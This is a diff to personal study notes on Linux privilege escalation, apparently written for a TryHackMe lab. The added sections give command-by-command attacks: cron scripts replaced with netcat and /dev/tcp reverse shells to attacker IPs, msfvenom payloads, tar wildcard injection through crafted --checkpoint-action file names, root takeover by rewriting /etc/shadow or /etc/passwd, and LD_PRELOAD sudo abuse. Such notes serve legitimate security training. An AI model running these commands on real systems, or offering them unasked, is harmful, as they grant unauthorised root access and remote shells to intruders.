@@ -1,4 +1,4 @@
-
+https://tryhackme.com/room/linuxprivesc
 # Enumerate
 
 On Linux ideally we would be looking for opportunities to gain access to a user account. 
@@ -10,6 +10,9 @@ Some exploits will also allow you to add your own account. In particular somethi
 
 shows current users permissions
 `sudo -l
+
+
+## LinPEAS
 
 first ssh into ip THEN
 ```
@@ -35,8 +38,7 @@ Start a server from the directory that contains LinEnum.sh
 3. `chmod +x LinEnum.sh
 4. Run `./LinEnum.sh` to begin scan
 
-##RootHelper
-
+## RootHelper
 
 The RootHelper/Linux Smart Enumeration module is a LinEnum fork with a heavy focus on privilege escalation.
 https://github.com/NullArray/RootHelper
@@ -45,6 +47,10 @@ https://github.com/NullArray/RootHelper
 # Priv Esc
 
 ## Exploiting SUID Files
+
+### Find all SUID/GUID executables
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
 
 SUID files: Look like
 `-rwsr-xr-x
@@ -63,7 +69,7 @@ Use this command to search the system for SUID/GUID files:
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-
+Google exploits for SUID binaries e.g. [exim-4.84-3](https://www.exploit-db.com/exploits/39535)
 
 ## Exploiting a writable /etc/passwd
 
@@ -104,11 +110,58 @@ crontabs have the following format:
 
 1. create a reverse shell payload for the cronjob to run 
 `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
-2. replace the binary with the payload
-`echo "mkfifo /tmp/ujlow; nc 10.4.3.201 8888 0</tmp/ujlow | /bin/sh >/tmp/ujlow 2>&1; rm /tmp/ujlow" > autoscript.sh`
+2. replace the binary that is called with cron, with the payload
+`echo "mkfifo /tmp/ujlow; nc 10.4.3.201 8888 0</tmp/ujlow | /bin/sh >/tmp/ujlow 2>&1; rm /tmp/ujlow" > cronscript.sh`
 3. start listener and wait for shell to land
 `nc -lvnp 8888`
 
+OR
+
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+```shell
+#!/bin/bash  
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+### Cron PATH Variable
+
+Search the PATH variable and see taht it starts with **/home/user** which is our user's home directory.
+`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+there is a job containing:
+` * * * * * root overwrite.sh
+
+- Create a file called **overwrite.sh** in your home directory with the following contents:
+`#!/bin/bash  
+`cp /bin/bash /tmp/rootbash  
+`chmod +xs /tmp/rootbash
+- Make sure that the file is executable:
+`chmod +x /home/user/overwrite.sh`
+
+- Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+`/tmp/rootbash -p`
+
+### Wildcards
+
+
+use `cat etc/crontab`
+Note that a [tar command](https://gtfobins.github.io/gtfobins/tar/) is being run with a wildcard (*) in your home directory.
+```shell
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+1. Use msfvenom  to generate a reverse shell ELF binary `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+2. Transfer the shell.elf file to `/home/user/` using scp or hosting a webserver on your box and using wget
+3. Make sure the file is executable: `chmod +x /home/user/shell.elf`
+4. Create these two files in /home/user:
+```shell
+touch /home/user/--checkpoint=1   
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+5. Set up a netcat listener and wait for the cronjob to run `nc -nvlp 4444`
 
 
 ## Exploiting PATH Variable
@@ -152,15 +205,78 @@ Exit out of the MYSQL shelll using `exit` then run the /tmp/rootbash executable 
 ```
 
 
+## Weak File Permissions
+
+### Readable `/etc/shadow` allows you to crack password Hashes
+
+Normal shadow file permissions:
+```shell
+-rw-r----- 1 root shadow 1474 Dec 17 20:46 /etc/shadow
+
+```
+Read/Writeable shadow file permissions:
+```shell
+~$ ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+```
+### Writeable `/etc/shadow`  
+
+- Generate a new password hash with a password of your choice: `mkpasswd -m sha-512 newpasswordhere`
+- Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+- Switch to the root user, using the new password: `su root`
+
+### Writable /etc/passwd
+
+- Generate a new password hash with a password of your choice: `openssl passwd newpasswordhere`
+- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+- Switch to the root user, using the new password: `su root`
+
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  
+
+Now switch to the newroot user, using the new password: `su newroot`
+
+
+### Shell escape
+
+https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/
+
+- List the programs which sudo allows your user to run: `sudo -l`
+- Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges
+
+
+## Environment Variables
+
+1. Check which environment variables are inherited (look for the env_keep options): `sudo -l`
+`env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+2. Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
+3. Run one of the programs you are allowed to run via sudo (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+`sudo LD_PRELOAD=/tmp/preload.so program-name-here`
+4. A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
+5. Run ldd against the apache2 program file to see which shared libraries are used by the program:
+`ldd /usr/sbin/apache2`
+6. Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
+7. Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+`sudo LD_LIBRARY_PATH=/tmp apache2`
+
+
 
 
 ---
 # Handy Nix Files
 
+https://tryhackme.com/room/linuxprivesc
+
 contains ssh configurations such as: PasswordAurhentication
 	`etc/ssh/ssshd_config
 A plain text file It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.
 	`/etc/passwd` 
+
+## New priv
+
+
+
 
 ---
 ## Windows 
